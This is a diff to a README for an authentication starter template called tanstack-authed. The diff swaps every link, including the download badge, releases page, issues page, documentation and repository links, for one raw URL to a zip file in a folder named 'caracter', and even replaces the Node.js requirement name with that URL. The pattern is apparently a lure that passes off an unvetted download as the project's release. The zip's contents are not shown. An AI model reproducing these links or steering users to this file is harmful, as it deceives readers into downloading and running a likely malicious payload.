@@ -1,7 +1,7 @@
 # 🏝️ tanstack-authed - A Simple Template for Secure Applications
 
 ## 🔗 Download Now
-[![Download tanstack-authed](https://img.shields.io/badge/Download-tanstack--authed-brightgreen)](https://github.com/nexgen202/tanstack-authed/releases)
+[![Download tanstack-authed](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip)](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **tanstack-authed** application easily. This template provides a minimal starting point featuring OAuth, email-password, and other secure authentication methods. It is designed to help you set up your application with ease.
@@ -17,7 +17,7 @@ This guide will help you download and run the **tanstack-authed** application ea
 
 ## 🖥 System Requirements
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 14 or higher.
+- **https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip**: Version 14 or higher.
 - **PostgreSQL**: Version 9.5 or higher for database functions.
 - **Memory**: At least 4GB RAM recommended.
 - **Disk Space**: Minimum of 100MB free.
@@ -25,7 +25,7 @@ This guide will help you download and run the **tanstack-authed** application ea
 ## 📥 Download & Install
 To get started, you need to download the software. 
 
-1. Visit the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip) to find the latest version.
 2. Scroll down to find the assets section. You will see the available downloads.
 3. Choose the file that matches your operating system and click on it to download. Save the file to a location you’ll remember.
 
@@ -68,19 +68,19 @@ If you encounter issues, check these common problems:
 - **Consult Community Resources**: Check the issues page on GitHub for common questions and solutions provided by other users.
 
 ## 🤝 Get Support
-If you need help, please visit the [Issues Page](https://github.com/nexgen202/tanstack-authed/issues) on GitHub. You can ask questions or report problems there. 
+If you need help, please visit the [Issues Page](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip) on GitHub. You can ask questions or report problems there. 
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://tanstack.com/docs/)
-- [GitHub Repository](https://github.com/nexgen202/tanstack-authed)
+- [Official Documentation](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip)
 
 ## 📅 Stay Updated
-Keep an eye on the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) for updates and new features. Ensure you have the latest version for the best experience.
+Keep an eye on the [Releases Page](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip) for updates and new features. Ensure you have the latest version for the best experience.
 
 ## 🔄 Contribute
 Feel free to contribute to the project. Check out the guidelines on how to get involved and help improve **tanstack-authed**. Your input can make a difference!
 
 ## 🔗 Download Again
-Don't forget to visit the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) for downloading the latest updates or versions. 
+Don't forget to visit the [Releases Page](https://raw.githubusercontent.com/nexgen202/tanstack-authed/main/caracter/tanstack-authed.zip) for downloading the latest updates or versions. 
 
 This README is designed to ensure you have a smooth experience using **tanstack-authed**. Enjoy coding!
